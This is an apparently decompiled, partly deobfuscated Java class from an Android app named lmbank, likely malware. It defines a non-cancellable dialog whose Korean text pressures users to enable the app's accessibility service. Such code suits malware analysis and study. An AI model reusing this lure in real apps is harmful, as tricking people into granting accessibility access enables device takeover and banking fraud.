package com.wish.lmbank.view.dialog;

import android.app.Dialog;
import android.content.Context;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.wish.lmbank.R;
import com.wish.lmbank.R2;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/view/dialog/AlertDialog.class */
public class AlertDialog extends Dialog implements View.OnClickListener {
    private Button button;
    private ClickListener clickListener;
    private Context mContext;
    private TextView textView;
    private String type;

    /* loaded from: cookie_9234504.jar:com/wish/lmbank/view/dialog/AlertDialog$ClickListener.class */
    public interface ClickListener {
        void onCallback(View view);
    }

    public AlertDialog(Context context) {
        super(context);
        this.mContext = context;
    }

    public void setClickListener(ClickListener clickListener) {
        this.clickListener = clickListener;
    }

    public void show(String str) {
        show();
        this.type = str;
//         if (bb7d7pu7.m5998("CBkZBQAKCB0ABgc").equals(str)) {
        if ("application".equals(str)) {
            this.textView.setText(this.mContext.getString(R2.string.alert_content));
            return;
        }
//         this.textView.setText(bb7d7pu7.m5998("hfzYhfTtSYXrxYXzwIT88YPR2UmF9e2E_N2F7fWC4_1JMoXJ-IPe1YXt2ESF7c2F0PGC-fVJhe31gtDthePNRA") + this.mContext.getString(R.string.a_) + bb7d7pu7.m5998("NEmE_uGF88CE_N1JhcrVhez9hfzVSYXJ_IXq6IXJ6IX00UmF7fWC0O2F481JhfTdhfPAhfTdSYPZ6YLjzIT8wILi4YLizUc"));
        this.textView.setText("앱을 사용하기 위해서는 [접근성-설치된 서비스-" + this.mContext.getString(R.string.a_) + "] 허용해 주셔야 정상적인 서비스 이용이 가능합니다.");
    }

    @Override // android.view.View.OnClickListener
    public void onClick(View view) {
//             if (this.type.equals(bb7d7pu7.m5998("DQwPCBwFHQ"))) {
            if (this.type.equals("default")) {
                this.clickListener.onCallback(view);
            }
            dismiss();
            return;
    }

    @Override // android.app.Dialog
    protected void onCreate(Bundle bundle) {
        {
            super.onCreate(bundle);
            setContentView(R2.layout.alertdialog);
            setCancelable(false);
            Button button = (Button) findViewById(R2.id.alert_yes);
            this.button = button;
            button.setOnClickListener(this);
            this.textView = (TextView) findViewById(R2.id.alert_detail);
            getWindow().setBackgroundDrawable(new ColorDrawable(0));
            return;
        }
    }
}
